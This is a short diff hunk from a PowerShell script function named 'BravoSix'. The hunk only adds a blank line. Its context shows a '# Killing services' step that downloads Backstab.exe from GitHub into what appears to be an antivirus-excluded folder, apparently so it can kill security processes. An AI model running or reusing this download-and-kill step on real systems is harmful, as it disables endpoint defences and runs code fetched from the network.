@@ -217,6 +217,7 @@ function BravoSix {
         }
     }
     
+    
     # Killing services 
     $backstabPath = $exclusionPath + "\Backstab.exe"
     Invoke-WebRequest https://github.com/RFC1918-hub/RFCRandom/raw/main/Backstab.exe -OutFile $backstabPath
